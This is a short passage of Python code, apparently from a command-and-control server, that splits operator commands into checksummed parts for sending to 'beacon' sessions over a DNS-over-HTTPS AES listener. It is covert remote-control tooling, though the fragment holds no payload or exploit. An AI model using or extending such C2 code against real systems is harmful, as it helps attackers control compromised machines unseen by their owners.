        sess = self.doh_aes_listener_instance.sessions[session_id]
        original_command = command.strip()
        parts = self.doh_aes_listener_instance.split_command_safe(original_command)
        if not parts:
            self.update_output_text(f"[!] Failed to split command for beacon {session_id[-8:]}\n",is_general=False, session_name=session_id)
            return False
        checksum = ""
        if parts and parts[0].startswith("cb:"):
            try:
                prefix = parts[0][3:].split(":", 2)
                if len(prefix) >= 2 and "/" in prefix[0]:
                    checksum = prefix[1]
            except:
                pass
        sess["pending_command_parts"] = parts
        sess["sent_parts_count"] = 0
        sess["command_checksum"] = checksum
        sess["command_total_parts"] = len(parts)
